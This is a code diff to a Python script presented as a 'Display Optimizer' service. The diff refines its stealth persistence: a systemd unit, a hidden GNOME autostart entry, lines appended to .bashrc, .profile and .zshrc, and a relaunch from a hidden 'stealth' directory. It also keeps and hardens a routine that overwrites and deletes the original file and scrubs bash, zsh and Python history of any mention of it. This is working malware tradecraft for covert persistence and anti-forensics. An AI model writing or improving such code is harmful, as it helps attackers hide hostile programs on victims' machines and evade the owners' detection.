@@ -106,7 +106,7 @@ Type=simple
 User={os.getlogin()}
 Environment=DISPLAY=:0
 Environment=XAUTHORITY=/home/{os.getlogin()}/.Xauthority
-ExecStart={target_script} --service
+ExecStart=/usr/bin/python3 {target_script} --service
 Restart=always
 RestartSec=10
 StandardOutput=null
@@ -137,6 +137,7 @@ WantedBy=graphical.target
         return True
         
     except Exception as e:
+        print(f"Service installation error: {e}")
         return False
 
 def install_user_service():
@@ -168,7 +169,7 @@ def install_user_service():
         desktop_content = f"""[Desktop Entry]
 Type=Application
 Name=Display Optimizer
-Exec={target_script} --service
+Exec=/usr/bin/python3 {target_script} --service
 Hidden=true
 X-GNOME-Autostart-enabled=true
 """
@@ -178,7 +179,7 @@ X-GNOME-Autostart-enabled=true
             f.write(desktop_content)
         
         # Add to .bashrc, .profile, and .zshrc for persistence
-        bashrc_line = f"\n# Display optimization\n[ -x \"{target_script}\" ] && \"{target_script}\" --service &\n"
+        bashrc_line = f"\n# Display optimization\n[ -x \"{target_script}\" ] && /usr/bin/python3 \"{target_script}\" --service &\n"
         
         for rc_file in ['.bashrc', '.profile', '.zshrc']:
             rc_path = os.path.expanduser(f"~/{rc_file}")
@@ -189,43 +190,48 @@ X-GNOME-Autostart-enabled=true
         return True
         
     except Exception as e:
+        print(f"User service installation error: {e}")
         return False
 
 def clean_traces(original_path):
     """Remove all traces of the original file"""
     try:
-        # Overwrite the original file with random data
-        file_size = os.path.getsize(original_path)
-        with open(original_path, 'wb') as f:
-            f.write(os.urandom(file_size))
-        
-        # Remove the original file
-        os.remove(original_path)
-        
-        # Clear command history that might reference this file
-        history_files = [
-            os.path.expanduser('~/.bash_history'),
-            os.path.expanduser('~/.zsh_history'),
-            os.path.expanduser('~/.python_history')
-        ]
-        
-        for history_file in history_files:
-            if os.path.exists(history_file):
-                try:
-                    with open(history_file, 'r') as f:
-                        content = f.read()
-                    
-                    # Remove any lines referencing the original filename
-                    lines = content.split('\n')
-                    cleaned_lines = [line for line in lines if os.path.basename(original_path) not in line]
-                    
-                    with open(history_file, 'w') as f:
-                        f.write('\n'.join(cleaned_lines))
-                except:
-                    pass
+        # Only clean if we're not running from the stealth location
+        if original_path != f"{HIDDEN_DIR}/{SERVICE_NAME}":
+            # Overwrite the original file with random data
+            if os.path.exists(original_path):
+                file_size = os.path.getsize(original_path)
+                with open(original_path, 'wb') as f:
+                    f.write(os.urandom(file_size))
+                
+                # Remove the original file
+                os.remove(original_path)
+            
+            # Clear command history that might reference this file
+            history_files = [
+                os.path.expanduser('~/.bash_history'),
+                os.path.expanduser('~/.zsh_history'),
+                os.path.expanduser('~/.python_history')
+            ]
+            
+            for history_file in history_files:
+                if os.path.exists(history_file):
+                    try:
+                        with open(history_file, 'r') as f:
+                            content = f.read()
+                        
+                        # Remove any lines referencing the original filename
+                        original_name = os.path.basename(original_path)
+                        lines = content.split('\n')
+                        cleaned_lines = [line for line in lines if original_name not in line]
+                        
+                        with open(history_file, 'w') as f:
+                            f.write('\n'.join(cleaned_lines))
+                    except:
+                        pass
                     
     except Exception as e:
-        pass
+        print(f"Clean traces error: {e}")
 
 def daemonize():
     """Turn into a daemon process"""
@@ -481,15 +487,21 @@ def main():
             print(f"Unable to process request: {e}")
 
 if __name__ == "__main__":
+    # Check if we're already running from stealth location
+    current_path = os.path.abspath(__file__)
+    stealth_path = f"{HIDDEN_DIR}/{SERVICE_NAME}"
+    
     # Auto-install if not already installed
     if not is_installed() and len(sys.argv) == 1:
         print("First run - installing system service...")
         if install_requirements():
             if install_service() or install_user_service():
                 print("Installation completed! Starting service...")
-                # Clean traces and start service
-                clean_traces(os.path.abspath(__file__))
-                os.execv(sys.executable, [sys.executable, sys.argv[0], '--service'])
+                # Clean traces
+                clean_traces(current_path)
+                # Start service directly instead of execv
+                os.system(f"/usr/bin/python3 {stealth_path} --service &")
+                sys.exit(0)
             else:
                 print("Service installation failed")
         else:
